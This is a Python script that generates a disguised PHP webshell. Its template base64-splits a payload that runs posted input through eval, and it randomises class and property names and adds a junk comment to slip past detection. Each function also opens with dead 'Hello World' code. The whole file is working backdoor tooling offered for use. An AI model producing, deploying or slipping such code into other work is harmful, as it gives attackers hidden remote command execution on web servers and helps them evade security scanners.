import random
shell = "<?php \nclass {0}{3}\n        public ${1} = null;\n        public ${2} = null;\n        public ${6} = null;\n        function __construct(){3}\n        $this->{1} = 'ZXZhbCgkX1BPU';\n        $this->{6} = '1RbYV0pOw==';\n        $this->{2} = @base64_decode($this->{1}.$this->{6});\n        @eval({5}.$this->{2}.{5});\n        {4}{4}\nnew {0}();\n?>"

def random_keys(len):
    if False:
        print('Hello World!')
    str = '`~-=!@#$%^&_+?<>|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str, len))

def random_name(len):
    if False:
        print('Hello World!')
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str, len))

def build_webshell():
    if False:
        print('Hello World!')
    className = random_name(4)
    parameter1 = random_name(5)
    parameter2 = random_name(6)
    lef = '{'
    rig = '}'
    disrupt = '"/*' + random_keys(7) + '*/"'
    parameter3 = random_name(6)
    shellc = shell.format(className, parameter1, parameter2, lef, rig, disrupt, parameter3)
    return shellc
if __name__ == '__main__':
    print(build_webshell())